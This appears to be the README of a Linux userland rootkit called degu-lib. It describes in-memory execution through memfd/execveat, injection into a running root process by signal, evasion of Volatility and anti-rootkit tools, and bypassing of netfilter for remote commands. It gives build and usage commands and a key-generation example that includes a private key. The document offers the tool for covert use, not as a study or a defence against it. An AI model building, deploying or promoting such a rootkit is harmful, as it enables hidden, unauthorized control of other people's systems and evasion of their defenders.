# degu-lib
DEGU is a stealth userland kit that doesn't use sys_clone/sys_execve call to run.

This software is an userland rootkit that can't be easily spotted by volatility and
conventionnal anti rootkit tools.

Actually it works on 3.17+ linux kernel to keep real in-memory execution with memfd and execveat, 
for lower kernels it fallback with tmpfs and fexecve.

It's an "autorelocatable" executable library (see p2s/pie2so.c for magical trick), and use signal 
to get execution inside parasited process without a fork, a thread or function hooking.

It can bypass netfilter settings for unidirectionnal command, and use ed25519 library to sign messages from client 
and exchange keys for AES session.

### BUILD DEBUG:
```
git submodule update --init
make clean && make
```
debug mode activate log in /tmp/debug file

### BUILD PROD:
```
git submodule update --init
make clean && PROD=yes make
```
### USAGE:

```
# ./degu.so <pid of root process>
```
### remake keys.h

it's preferable to change keys.h using python script dgu 
( see [degu-client](https://github.com/io-tl/degu-client) repository )

```
$ dgu keygen
#define IV            { 0xa4,0x1a,0x8a,0xb3,0x24,0x2e,0x46,0x0a,0x4e,0x84,0xee,0x15,0xe5,0x52,0x40,0x96}
#define KNOCK_KEY     { 0x0b,0xbd,0xe9,0xa9,0x41,0xfb,0xe2,0xa6,0xe6,0x84,0xb0,0x72,0x4f,0x7d,0x32,0x3b,0xc4,0x3d,0x39,0x89,0xda,0x05,0xc4,0x8f,0x02,0xe8,0x0b,0x11,0xeb,0x81,0x7a,0x08}
#define MASTER_PUBKEY { 0x2f,0x9f,0xed,0xf0,0x79,0x0e,0xa5,0x81,0x9a,0xbb,0x39,0xb4,0x63,0x88,0x59,0x75,0x09,0xd2,0xa0,0x4f,0xeb,0xc7,0x24,0xca,0xfc,0xfa,0xf9,0x4e,0xbf,0x1c,0x99,0x51}

// PRIVATE_KEY="c03590c7008d7e8c752ec28838c9921f66d6571359366e462c661809a0f01379aec8006866d877f074793079d6152e5a7ec757b0546fb72e25bf7dc6a696a3f1"
```


or just :
```
$ dgu keygen > keys.h && make clean && PROD=yes make
```

[![asciicast](https://asciinema.org/a/490680.svg)](https://asciinema.org/a/490680)
